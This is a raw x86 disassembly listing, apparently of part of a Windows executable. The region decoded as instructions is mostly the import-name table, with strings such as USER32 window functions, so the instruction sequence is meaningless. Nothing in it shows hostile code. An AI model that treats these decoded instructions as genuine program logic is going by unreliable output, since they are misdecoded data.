  4132dd:	ins    BYTE PTR es:[edi],dx
  4132de:	add    BYTE PTR [eax],al
  4132e0:	inc    esi
  4132e1:	add    BYTE PTR [ebx+0x6c],al
  4132e4:	outs   dx,DWORD PTR ds:[esi]
  4132e5:	jae    0x41334c
  4132e7:	inc    esp
  4132e8:	gs jae 0x413356
  4132eb:	je     0x41335c
  4132ed:	jo     0x4132ef
  4132ef:	add    BYTE PTR [ebp+0x61694400],bl
  4132f5:	ins    BYTE PTR es:[edi],dx
  4132f6:	outs   dx,DWORD PTR ds:[esi]
  4132f7:	addr16 inc edx
  4132f9:	outs   dx,DWORD PTR ds:[esi]
  4132fa:	js     0x41334c
  4132fc:	popa   
  4132fd:	jb     0x413360
  4132ff:	ins    DWORD PTR es:[edi],dx
  413300:	push   edi
  413301:	add    BYTE PTR [edx],cl
  413303:	add    BYTE PTR [ecx+0x72],al
  413306:	jb     0x413369
  413308:	outs   dx,BYTE PTR ds:[esi]
  413309:	addr16 gs dec ecx
  41330c:	arpl   WORD PTR [edi+0x6e],bp
  41330f:	imul   esp,DWORD PTR [ebx+0x57],0x6f646e69
  413316:	ja     0x41338b
  413318:	add    BYTE PTR [eax],al
  41331a:	fld    QWORD PTR [eax]
  41331c:	inc    ebp
  41331d:	jno    0x413394
  41331f:	popa   
  413320:	ins    BYTE PTR es:[edi],dx
  413321:	push   edx
  413322:	arpl   WORD PTR gs:[eax+eax*1-0x45],si
  413327:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41332b:	fs push ebx
  41332d:	je     0x4133a1
  41332f:	imul   ebp,DWORD PTR [esi+0x67],0x1ee0041
  413336:	push   eax
  413337:	gs imul ecx,DWORD PTR gs:[ebp+0x65],0x73
  41333d:	jae    0x4133a0
  41333f:	addr16 gs inc ecx
  413342:	add    BYTE PTR [eax],al
  413344:	cmp    DWORD PTR [eax],eax
  413346:	inc    ebx
  413347:	push   0x70557261
  41334c:	jo     0x4133b3
  41334e:	jb     0x4133a7
  413350:	add    BYTE PTR [eax],al
  413352:	adc    eax,DWORD PTR [ecx]
  413354:	inc    edi
  413355:	gs je  0x41339c
  413358:	outs   dx,DWORD PTR ds:[esi]
  413359:	jne    0x4133bd
  41335b:	ins    BYTE PTR es:[edi],dx
  41335c:	gs inc ebx
  41335e:	ins    BYTE PTR es:[edi],dx
  41335f:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  413366:	add    BYTE PTR [eax],al
  413368:	mov    ds:0x57734901,eax
  41336d:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  413374:	jae    0x4133df
  413376:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41337a:	mov    esp,0x61724400
  41337f:	ja     0x4133d5
  413381:	gs js  0x4133f8
  413384:	push   edi
  413385:	add    BYTE PTR [ebp+0x61724400],dh
  41338b:	ja     0x4133da
  41338d:	outs   dx,BYTE PTR gs:[esi]
  41338f:	jne    0x4133d3
  413391:	popa   
  413392:	jb     0x413394
  413394:	jle    0x413397
  413396:	dec    eax
  413397:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  41339f:	jne    0x4133ea
  4133a1:	je     0x413408
  4133a3:	ins    DWORD PTR es:[edi],dx
  4133a4:	add    BYTE PTR [eax],al
  4133a6:	mov    al,BYTE PTR [edx]
  4133a8:	push   esp
  4133a9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  4133b1:	ja     0x413426
  4133b3:	add    BYTE PTR [eax],ch
  4133b5:	add    BYTE PTR [ebx+0x68],al
  4133b8:	popa   
  4133b9:	jb     0x413407
  4133bb:	outs   dx,DWORD PTR ds:[esi]
  4133bc:	ja     0x413423
  4133be:	jb     0x413402
  4133c0:	jne    0x413428
  4133c2:	push   di
  4133c4:	add    BYTE PTR [eax],al
  4133c6:	bound  eax,QWORD PTR [eax]
  4133c8:	inc    ebx
  4133c9:	jb     0x413430
  4133cb:	popa   
  4133cc:	je     0x413433
  4133ce:	push   edi
  4133cf:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  4133d6:	inc    ecx
  4133d7:	add    BYTE PTR [ebx+0x2],dh
  4133da:	push   ebx
  4133db:	gs je  0x413435
  4133de:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4133e5:	js     0x41345b
  4133e7:	inc    ecx
  4133e8:	add    BYTE PTR [eax],al
  4133ea:	pop    ecx
  4133eb:	add    dl,BYTE PTR [ebx+0x65]
  4133ee:	je     0x413442
  4133f0:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4133f5:	jo     0x41346b
  4133f7:	jns    0x4133f9
  4133f9:	add    bh,ah
  4133fb:	add    BYTE PTR [esi+0x72],al
  4133fe:	popa   
  4133ff:	ins    DWORD PTR es:[edi],dx
  413400:	gs push edx
  413402:	arpl   WORD PTR gs:[eax+eax*1+0x3b],si
  413407:	add    DWORD PTR [edi+0x65],eax
  41340a:	je     0x413459
  41340c:	gs jae 0x413482
  41340f:	popa   
  413410:	addr16 gs inc ebp
  413413:	js     0x413489
  413415:	jb     0x413478
  413417:	dec    ecx
  413418:	outs   dx,BYTE PTR ds:[esi]
  413419:	outs   dx,WORD PTR ds:[esi]
  41341b:	add    BYTE PTR [eax+0x2],ch
  41341e:	push   ebx
  41341f:	gs je  0x413477
  413422:	jae    0x413489
  413424:	jb     0x413475
  413426:	bound  ebp,QWORD PTR [edx+0x65]
  413429:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  41342d:	outs   dx,WORD PTR ds:[esi]
  41342f:	jb     0x41349e
  413431:	popa   
  413432:	je     0x41349d
  413434:	outs   dx,DWORD PTR ds:[esi]
  413435:	outs   dx,BYTE PTR ds:[esi]
  413436:	push   edi
  413437:	add    BYTE PTR [ebx+0x73654400],dl
  41343d:	je     0x4134b1
  41343f:	outs   dx,DWORD PTR ds:[esi]
  413440:	jns    0x413483
  413442:	arpl   WORD PTR [ebx+0x65],sp
  413445:	ins    BYTE PTR es:[edi],dx
  413446:	gs jb  0x4134aa
  413449:	je     0x4134ba
  41344b:	jb     0x4134a1
  41344d:	popa   
  41344e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413452:	xor    al,BYTE PTR [ecx]
  413454:	inc    edi
  413455:	gs je  0x4134a5
  413458:	outs   dx,BYTE PTR gs:[esi]
  41345a:	jne    0x4134a5
  41345c:	je     0x4134c3
  41345e:	ins    DWORD PTR es:[edi],dx
  41345f:	inc    ebx
  413460:	outs   dx,DWORD PTR ds:[esi]
  413461:	jne    0x4134d1
  413463:	je     0x413465
  413465:	add    BYTE PTR [ebp+0x79656b02],bh
  41346b:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  41346f:	jbe    0x4134d6
  413471:	outs   dx,BYTE PTR ds:[esi]
  413472:	je     0x413474
  413474:	call   0x65b1837a
  413479:	outs   dx,BYTE PTR ds:[esi]
  41347a:	dec    ecx
  41347b:	arpl   WORD PTR [edi+0x6e],bp
  41347e:	add    BYTE PTR [eax],al
  413480:	das    
  413481:	add    dl,BYTE PTR [ebx+0x65]
  413484:	je     0x4134c7
  413486:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  41348a:	gs push edi
  41348c:	imul   ebp,DWORD PTR [esi+0x64],0x5f00776f
  413493:	add    dl,BYTE PTR [ebx+0x65]
  413496:	je     0x4134eb
  413498:	jns    0x41350d
  41349a:	inc    ebx
  41349b:	outs   dx,DWORD PTR ds:[esi]
  41349c:	ins    BYTE PTR es:[edi],dx
  41349d:	outs   dx,DWORD PTR ds:[esi]
  41349e:	jb     0x413513
  4134a0:	add    BYTE PTR [eax],al
  4134a2:	mov    dh,0x1
  4134a4:	dec    esp
  4134a5:	outs   dx,DWORD PTR ds:[esi]
  4134a6:	popa   
  4134a7:	fs dec ebp
  4134a9:	outs   dx,BYTE PTR gs:[esi]
  4134ab:	jne    0x4134ee
  4134ad:	add    BYTE PTR ds:0x61684300,ch
  4134b3:	jb     0x413503
  4134b5:	gs js  0x41352c
  4134b8:	push   edi
  4134b9:	add    dh,cl
  4134bb:	add    DWORD PTR [ebp+0x65],ecx
  4134be:	jae    0x413533
  4134c0:	popa   
  4134c1:	addr16 gs inc edx
  4134c4:	outs   dx,DWORD PTR ds:[esi]
  4134c5:	js     0x413508
  4134c7:	add    BYTE PTR [edx+eax*1+0x6e617254],dl
  4134ce:	jae    0x41353c
  4134d0:	popa   
  4134d1:	je     0x413538
  4134d3:	inc    ecx
  4134d4:	arpl   WORD PTR [ebx+0x65],sp
  4134d7:	ins    BYTE PTR es:[edi],dx
  4134d8:	gs jb  0x41353c
  4134db:	je     0x41354c
  4134dd:	jb     0x413536
  4134df:	add    BYTE PTR [ecx+0x66654400],cl
  4134e5:	inc    esi
  4134e6:	jb     0x413549
  4134e8:	ins    DWORD PTR es:[edi],dx
  4134e9:	gs push eax
  4134eb:	jb     0x41355c
  4134ed:	arpl   WORD PTR [ecx+0x0],ax
  4134f0:	test   DWORD PTR [edx],eax
  4134f2:	push   ebx
  4134f3:	jns    0x413568
  4134f5:	je     0x41355c
  4134f7:	ins    DWORD PTR es:[edi],dx
  4134f8:	push   eax
  4134f9:	popa   
  4134fa:	jb     0x41355d
  4134fc:	ins    DWORD PTR es:[edi],dx
  4134fd:	gs je  0x413565
  413500:	jb     0x413575
  413502:	dec    ecx
  413503:	outs   dx,BYTE PTR ds:[esi]
  413504:	outs   dx,WORD PTR ds:[esi]
  413506:	inc    ecx
  413507:	add    BYTE PTR ds:0x67655202,al
  41350d:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  413514:	popa   
  413515:	jae    0x41358a
  413517:	push   edi
  413518:	add    BYTE PTR [eax],al
  41351a:	iret   
  41351b:	add    DWORD PTR [ebp+0x65],ecx
  41351e:	jae    0x413593
  413520:	popa   
  413521:	addr16 gs inc edx
  413524:	outs   dx,DWORD PTR ds:[esi]
  413525:	js     0x41356c
  413527:	js     0x41356a
  413529:	add    BYTE PTR [ecx],ch
  41352b:	add    BYTE PTR [ebx+0x68],al
  41352e:	popa   
  41352f:	jb     0x41357d
  413531:	outs   dx,DWORD PTR ds:[esi]
  413532:	ja     0x413599
  413534:	jb     0x41358d
  413536:	add    BYTE PTR [eax],al
  413538:	pushf  
  413539:	add    BYTE PTR [ecx+ebp*2+0x61],al
  41353d:	ins    BYTE PTR es:[edi],dx
  41353e:	outs   dx,DWORD PTR ds:[esi]
  41353f:	addr16 inc edx
  413541:	outs   dx,DWORD PTR ds:[esi]
  413542:	js     0x413594
  413544:	popa   
  413545:	jb     0x4135a8
  413547:	ins    DWORD PTR es:[edi],dx
  413548:	inc    ecx
  413549:	add    BYTE PTR [esi],bh
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x41359d
  413550:	gs jae 0x4135c6
  413553:	popa   
  413554:	addr16 gs push edi
  413557:	add    BYTE PTR [edi+0x2],dl
  41355a:	push   ebx
  41355b:	gs je  0x4135ae
  41355e:	jb     0x4135cf
  413560:	jo     0x4135b9
  413562:	add    BYTE PTR [eax],al
  413564:	loope  0x413566
  413566:	inc    esi
  413567:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  41356e:	outs   dx,DWORD PTR ds:[esi]
  41356f:	ja     0x4135b2
  413571:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  413578:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x6f43004a
  413580:	jo     0x4135fb
  413582:	inc    ecx
  413583:	arpl   WORD PTR [ebx+0x65],sp
  413586:	ins    BYTE PTR es:[edi],dx
  413587:	gs jb  0x4135eb
  41358a:	je     0x4135fb
  41358c:	jb     0x4135e2
  41358e:	popa   
  41358f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  413593:	add    cl,al
  413595:	add    BYTE PTR [ebp+0x6e],al
  413598:	popa   
  413599:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  41359d:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  4135a4:	pop    edx
  4135a5:	add    dl,BYTE PTR [ebx+0x65]
  4135a8:	je     0x4135fd
  4135aa:	arpl   WORD PTR [edx+0x6f],si
  4135ad:	ins    BYTE PTR es:[edi],dx
  4135ae:	ins    BYTE PTR es:[edi],dx
  4135af:	dec    ecx
  4135b0:	outs   dx,BYTE PTR ds:[esi]
  4135b1:	outs   dx,WORD PTR ds:[esi]
  4135b3:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4135ba:	push   ebx
  4135bb:	je     0x41362f
  4135bd:	imul   ebp,DWORD PTR [esi+0x67],0x350057
  4135c4:	inc    ebx
  4135c5:	push   0x6f547261
  4135ca:	dec    edi
  4135cb:	gs ins DWORD PTR es:[edi],dx
  4135cd:	push   edi
  4135ce:	add    BYTE PTR [eax],al
  4135d0:	inc    BYTE PTR [eax]
  4135d2:	inc    edi
  4135d3:	gs je  0x413619
  4135d6:	ins    BYTE PTR es:[edi],dx
  4135d7:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4135de:	jb     0x4135e0
  4135e0:	dec    edx
  4135e1:	add    dl,BYTE PTR [ebx+0x65]
  4135e4:	je     0x413633
  4135e6:	outs   dx,BYTE PTR gs:[esi]
  4135e8:	jne    0x41362e
  4135ea:	gs popaw 
  4135ed:	jne    0x41365b
  4135ef:	je     0x41363a
  4135f1:	je     0x413658
  4135f3:	ins    DWORD PTR es:[edi],dx
  4135f4:	add    BYTE PTR [eax],al
  4135f6:	mov    DWORD PTR [ecx],eax
  4135f8:	dec    ecx
  4135f9:	outs   dx,BYTE PTR ds:[esi]
  4135fa:	jbe    0x41365d
  4135fc:	ins    BYTE PTR es:[edi],dx
  4135fd:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  413605:	je     0x413607
  413607:	add    BYTE PTR [ecx+0x616f4c01],ch
  41360d:	fs inc edx
  41360f:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x15004170
  413617:	add    DWORD PTR [edi+0x65],eax
  41361a:	je     0x413662
  41361c:	outs   dx,DWORD PTR ds:[esi]
  41361d:	jb     0x413684
  41361f:	addr16 jb 0x413691
  413622:	jne    0x413692
  413624:	fs push edi
  413626:	imul   ebp,DWORD PTR [esi+0x64],0xb800776f
  41362d:	add    BYTE PTR [edx+esi*2+0x61],al
  413631:	ja     0x413686
  413633:	je     0x413696
  413635:	je     0x41369c
  413637:	push   edi
  413638:	add    BYTE PTR [eax],al
  41363a:	xchg   ebx,eax
  41363b:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41363f:	outs   dx,BYTE PTR ds:[esi]
  413640:	jae    0x4136ae
  413642:	popa   
  413643:	je     0x4136aa
  413645:	inc    ecx
  413646:	arpl   WORD PTR [ebx+0x65],sp
  413649:	ins    BYTE PTR es:[edi],dx
  41364a:	gs jb  0x4136ae
  41364d:	je     0x4136be
  41364f:	jb     0x413692
  413651:	add    BYTE PTR [eax+0x57734901],ah
  413657:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41365e:	and    eax,0x6e655302
  413663:	fs dec ecx
  413665:	outs   dx,BYTE PTR ds:[esi]
  413666:	jo     0x4136dd
  413668:	je     0x41366a
  41366a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41366b:	add    DWORD PTR [ebx+0x69],ecx
  41366e:	ins    BYTE PTR es:[edi],dx
  41366f:	ins    BYTE PTR es:[edi],dx
  413670:	push   esp
  413671:	imul   ebp,DWORD PTR [ebp+0x65],0x1b10072
  413678:	dec    esp
  413679:	outs   dx,DWORD PTR ds:[esi]
  41367a:	popa   
  41367b:	fs dec ecx
  41367d:	ins    DWORD PTR es:[edi],dx
  41367e:	popa   
  41367f:	addr16 gs inc ecx
  413682:	add    BYTE PTR [eax],al
  413684:	daa    
  413685:	add    DWORD PTR [edi+0x65],eax
  413688:	je     0x4136d5
  41368a:	gs jns 0x4136ef
  41368d:	outs   dx,DWORD PTR ds:[esi]
  41368e:	popa   
  41368f:	jb     0x4136f5
  413691:	push   esp
  413692:	jns    0x413704
  413694:	add    BYTE PTR gs:[ebx+0x61724400],dh
  41369b:	ja     0x4136e6
  41369d:	arpl   WORD PTR [edi+0x6e],bp
  4136a0:	add    BYTE PTR [eax],al
  4136a2:	mov    BYTE PTR [edx],al
  4136a4:	push   esp
  4136a5:	popa   
  4136a6:	bound  esp,QWORD PTR [edx+0x65]
  4136a9:	fs push esp
  4136ab:	gs js  0x413722
  4136ae:	dec    edi
  4136af:	jne    0x413725
  4136b1:	push   edi
  4136b2:	add    BYTE PTR [eax],al
  4136b4:	push   0x74654701
  4136b9:	push   edi
  4136ba:	imul   ebp,DWORD PTR [esi+0x64],0x8200776f
  4136c1:	add    DWORD PTR [ecx+0x6e],ecx
  4136c4:	data16 ins BYTE PTR es:[edi],dx
  4136c6:	popa   
  4136c7:	je     0x41372e
  4136c9:	push   edx
  4136ca:	arpl   WORD PTR gs:[eax+eax*1-0x2b],si
  4136cf:	add    DWORD PTR [ebp+0x65],ecx
  4136d2:	jae    0x413747
  4136d4:	popa   
  4136d5:	addr16 gs inc edx
  4136d8:	outs   dx,DWORD PTR ds:[esi]
  4136d9:	js     0x413732
  4136db:	add    BYTE PTR [eax],bh
  4136dd:	add    dl,BYTE PTR [ebx+0x65]
  4136e0:	je     0x413725
  4136e2:	jne    0x413756
  4136e4:	jae    0x413755
  4136e6:	jb     0x4136e8
  4136e8:	mov    es,WORD PTR [edx]
  4136ea:	push   esp
  4136eb:	outs   dx,DWORD PTR ds:[esi]
  4136ec:	push   ebp
  4136ed:	outs   dx,BYTE PTR ds:[esi]
  4136ee:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  4136f5:	add    BYTE PTR [esi+0x52734901],bl
  4136fb:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  413700:	jo     0x413776
  413702:	jns    0x413704
  413704:	clc    
  413705:	add    BYTE PTR [edi+0x65],al
  413708:	je     0x41374d
  41370a:	ins    BYTE PTR es:[edi],dx
  41370b:	popa   
  41370c:	jae    0x413781
  41370e:	dec    esp
  41370f:	outs   dx,DWORD PTR ds:[esi]
  413710:	outs   dx,BYTE PTR ds:[esi]
  413711:	addr16 inc ecx
  413713:	add    BYTE PTR [ecx+0x57734901],ah
  413719:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  413720:	popa   
  413721:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  413725:	add    BYTE PTR [edx+eax*1+0x74697753],al
  41372c:	arpl   WORD PTR [eax+0x54],bp
  41372f:	outs   dx,DWORD PTR ds:[esi]
  413730:	push   esp
  413731:	push   0x69577369
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	outs   dx,DWORD PTR fs:[esi]
  413739:	ja     0x41373b
  41373b:	add    BYTE PTR [ebx],cl
  41373d:	add    DWORD PTR [edi+0x65],eax
  413740:	je     0x413786
  413742:	inc    ebx
  413743:	inc    ebp
  413744:	js     0x413746
  413746:	stos   DWORD PTR es:[edi],eax
  413747:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41374b:	fs inc ebx
  41374d:	jne    0x4137c1
  41374f:	jae    0x4137c0
  413751:	jb     0x413794
  413753:	add    BYTE PTR [edx+0x766e4901],cl
  413759:	popa   
  41375a:	ins    BYTE PTR es:[edi],dx
  41375b:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  413763:	add    BYTE PTR [edx+0x57734901],ah
  413769:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  413770:	imul   esp,DWORD PTR [ebx+0x6f],0xe4006564
  413777:	add    DWORD PTR [edi+0x66],ecx
  41377a:	data16 jae 0x4137e2
  41377d:	je     0x4137d1
  41377f:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413784:	cmp    eax,0x65684300
  413789:	arpl   WORD PTR [ebx+0x52],bp
  41378c:	popa   
  41378d:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  413795:	outs   dx,BYTE PTR ds:[esi]
  413796:	add    BYTE PTR [eax],al
  413798:	adc    eax,DWORD PTR [edx]
  41379a:	push   edx
  41379b:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  4137a4:	outs   dx,BYTE PTR ds:[esi]
  4137a5:	outs   dx,DWORD PTR fs:[esi]
  4137a7:	ja     0x4137f6
  4137a9:	gs jae 0x41381f
  4137ac:	popa   
  4137ad:	addr16 gs push edi
  4137b0:	add    BYTE PTR [eax],al
  4137b2:	or     al,BYTE PTR [edx]
  4137b4:	push   edx
  4137b5:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  4137be:	je     0x41380b
  4137c0:	gs jns 0x4137c3
  4137c3:	add    BYTE PTR [eax+0x746e4901],cl
  4137c9:	gs jb  0x41383f
  4137cc:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  4137d1:	arpl   WORD PTR [eax+eax*1-0x17],si
  4137d5:	add    DWORD PTR [edi+0x70],ecx
  4137d8:	outs   dx,BYTE PTR gs:[esi]
  4137da:	dec    ecx
  4137db:	outs   dx,BYTE PTR ds:[esi]
  4137dc:	jo     0x413853
  4137de:	je     0x413824
  4137e0:	gs jae 0x41384e
  4137e3:	je     0x413854
  4137e5:	jo     0x4137e7
  4137e7:	add    BYTE PTR [edx],al
  4137e9:	add    dl,BYTE PTR [edx+0x65]
  4137ec:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  4137f4:	popa   
  4137f5:	jae    0x41386a
  4137f7:	inc    ecx
  4137f8:	add    BYTE PTR [eax],al
  4137fa:	jno    0x4137fe
  4137fc:	push   ebx
  4137fd:	gs je  0x413857
  413800:	imul   ebp,DWORD PTR [esi+0x64],0x6752776f
  413807:	outs   dx,BYTE PTR ds:[esi]
  413808:	add    BYTE PTR [eax],al
  41380a:	mov    ecx,0x616f4c01
  41380f:	fs dec ebp
  413811:	outs   dx,BYTE PTR gs:[esi]
  413813:	jne    0x41386c
  413815:	add    BYTE PTR ds:0x74654701,ch
  41381b:	dec    ebp
  41381c:	outs   dx,BYTE PTR gs:[esi]
  41381e:	jne    0x413863
  413820:	push   0x4d6b6365
  413825:	popa   
  413826:	jb     0x413893
  413828:	inc    esp
  413829:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413830:	outs   dx,BYTE PTR ds:[esi]
  413831:	jae    0x413833
  413833:	add    BYTE PTR [esi+0x66654400],cl
  413839:	push   edi
  41383a:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413841:	outs   dx,DWORD PTR ds:[esi]
  413842:	arpl   WORD PTR [ecx+0x0],ax
  413845:	add    BYTE PTR [ebx],al
  413847:	add    BYTE PTR [ecx+0x64],al
  41384a:	push   0x75
  41384c:	jae    0x4138c2
  41384e:	push   edi
  41384f:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  413856:	arpl   WORD PTR [ebp+eax*2+0x78],si
  41385a:	add    BYTE PTR [eax],al
  41385c:	add    eax,0x6c6c4100
  413861:	outs   dx,DWORD PTR ds:[esi]
  413862:	ja     0x4138b7
  413864:	gs je  0x4138ad
  413867:	outs   dx,DWORD PTR ds:[esi]
  413868:	jb     0x4138cf
  41386a:	addr16 jb 0x4138dc
  41386d:	jne    0x4138dd
  41386f:	fs push edi
  413871:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413878:	ja     0x41387b
  41387a:	inc    edi
  41387b:	gs je  0x4138d5
  41387e:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  413885:	js     0x4138fb
  413887:	dec    esp
  413888:	outs   dx,BYTE PTR gs:[esi]
  41388a:	addr16 je 0x4138f5
  41388d:	push   edi
  41388e:	add    BYTE PTR [eax],al
  413890:	pushf  
  413891:	add    DWORD PTR [ecx+0x73],ecx
  413894:	dec    ecx
  413895:	arpl   WORD PTR [edi+0x6e],bp
  413898:	imul   esp,DWORD PTR [ebx+0x0],0x53024e00
  41389f:	gs je  0x4138ef
  4138a2:	outs   dx,BYTE PTR gs:[esi]
  4138a4:	jne    0x4138ef
  4138a6:	je     0x41390d
  4138a8:	ins    DWORD PTR es:[edi],dx
  4138a9:	dec    ecx
  4138aa:	outs   dx,BYTE PTR ds:[esi]
  4138ab:	outs   dx,WORD PTR ds:[esi]
  4138ad:	push   edi
  4138ae:	add    BYTE PTR [eax],al
  4138b0:	dec    eax
  4138b1:	add    dl,BYTE PTR [ebx+0x65]
  4138b4:	je     0x413903
  4138b6:	outs   dx,BYTE PTR gs:[esi]
  4138b8:	jne    0x4138ba
  4138ba:	inc    esp
  4138bb:	add    BYTE PTR [ebx+0x6c],al
  4138be:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4138c5:	jb     0x4138c7
  4138c7:	add    cl,al
  4138c9:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  4138cd:	imul   esi,DWORD PTR [ebp+0x70],0x49
  4138d1:	arpl   WORD PTR [edi+0x6e],bp
  4138d4:	dec    ecx
  4138d5:	fs inc esi
  4138d7:	jb     0x413948
  4138d9:	ins    DWORD PTR es:[edi],dx
  4138da:	inc    esp
  4138db:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4138e2:	jns    0x4138e4
  4138e4:	add    BYTE PTR ss:[ebx+0x68],al
  4138e8:	popa   
  4138e9:	jb     0x413940
  4138eb:	jo     0x41395d
  4138ed:	gs jb  0x413931
  4138f0:	add    BYTE PTR [eax],al
  4138f2:	mov    edi,0x636f4c01
  4138f7:	imul   edx,DWORD PTR [edi+0x69],0x6e
  4138fb:	outs   dx,DWORD PTR fs:[esi]
  4138fd:	ja     0x413954
  4138ff:	jo     0x413965
  413901:	popa   
  413902:	je     0x413969
  413904:	add    BYTE PTR [eax],al
  413906:	cmp    BYTE PTR [ecx],al
  413908:	inc    edi
  413909:	gs je  0x413959
  41390c:	outs   dx,BYTE PTR gs:[esi]
  41390e:	jne    0x413963
  413910:	je     0x413984
  413912:	imul   ebp,DWORD PTR [esi+0x67],0xc9000041
  413919:	add    DWORD PTR [ebp+0x61],ecx
  41391c:	jo     0x413975
  41391e:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  413925:	imul   ebp,DWORD PTR [esi+0x74],0x1620073
  41392c:	inc    edi
  41392d:	gs je  0x413984
  413930:	outs   dx,DWORD PTR ds:[esi]
  413931:	jo     0x41398a
  413933:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41393a:	pop    ecx
  41393b:	add    BYTE PTR [ebx+0x72],al
  41393e:	gs popa 
  413940:	je     0x4139a7
  413942:	inc    esp
  413943:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  41394a:	jb     0x4139ad
  41394c:	ins    DWORD PTR es:[edi],dx
  41394d:	push   edi
  41394e:	add    BYTE PTR [eax],al
  413950:	inc    edx
  413951:	add    DWORD PTR [edi+0x65],eax
  413954:	je     0x4139a4
  413956:	gs js  0x4139cd
  413959:	inc    esp
  41395a:	ins    BYTE PTR es:[edi],dx
  41395b:	addr16 inc edi
  41395d:	jb     0x4139ce
  41395f:	jne    0x4139d1
  413961:	dec    ecx
  413962:	je     0x4139c9
  413964:	ins    DWORD PTR es:[edi],dx
  413965:	add    bl,bh
  413967:	add    DWORD PTR [eax+0x74],edx
  41396a:	dec    ecx
  41396b:	outs   dx,BYTE PTR ds:[esi]
  41396c:	push   edx
  41396d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413972:	push   ebp
  413973:	push   ebx
  413974:	inc    ebp
  413975:	push   edx
  413976:	xor    esi,DWORD PTR [edx]
  413978:	cs fs ins BYTE PTR es:[edi],dx
  41397b:	ins    BYTE PTR es:[edi],dx
  41397c:	add    BYTE PTR [eax],al
  41397e:	jns    0x4139c5
  413980:	pop    ecx
  413981:	je     0x4139cb
  413983:	push   ebp
  413984:	jp     0x4139f2
  413986:	jae    0x4139f8
  413988:	push   ecx
  413989:	dec    edx
  41398a:	push   0x47
  41398c:	jne    0x4139d4
  41398e:	fidivr WORD PTR ds:0x3de60041
  413994:	inc    ecx
  413995:	add    dh,dl
  413997:	cmp    eax,DWORD PTR [ecx+0x0]
  41399a:	out    dx,al
  41399b:	or     esi,DWORD PTR [edx+0x3a4f7d0e]
  4139a1:	dec    edi
  4139a2:	ja     0x4139f3
  4139a4:	cmp    DWORD PTR [edi+0x4f],ecx
  4139a7:	dec    edi
  4139a8:	cmp    al,0x4f
  4139aa:	jb     0x4139fb
  4139ac:	xor    ecx,DWORD PTR [edi+0x5e]
  4139af:	dec    edi
  4139b0:	ss dec edi
  4139b2:	jnp    0x413a03
  4139b4:	xor    eax,0x2a4f3a4f
  4139b9:	dec    edi
  4139ba:	push   ds
  4139bb:	push   edx
  4139bc:	pop    ds
  4139bd:	push   ebx
  4139be:	cmp    eax,0x3a4f7d4f
  4139c3:	dec    edi
  4139c4:	ja     0x413a15
  4139c6:	cmp    DWORD PTR [edi+0x4f],ecx
  4139c9:	dec    edi
  4139ca:	cmp    al,0x4f
  4139cc:	jb     0x413a1d
  4139ce:	xor    ecx,DWORD PTR [edi+0x5e]
  4139d1:	dec    edi
  4139d2:	ss dec edi
  4139d4:	ins    DWORD PTR es:[edi],dx
  4139d5:	dec    edi
  4139d6:	xor    eax,0x2a4f3a4f
  4139db:	dec    edi
  4139dc:	push   ds
  4139dd:	bound  ebx,QWORD PTR [edi]
  4139df:	arpl   WORD PTR ds:0x3a4f7d4f,di
  4139e5:	dec    edi
  4139e6:	push   0x4f
  4139e8:	cmp    DWORD PTR [edi+0x7b],ecx
  4139eb:	dec    edi
  4139ec:	cmp    eax,0x304f484f
  4139f1:	dec    edi
  4139f2:	cmp    cl,BYTE PTR [edi+0x34]
  4139f5:	dec    edi
  4139f6:	push   ds
  4139f7:	jb     0x413a18
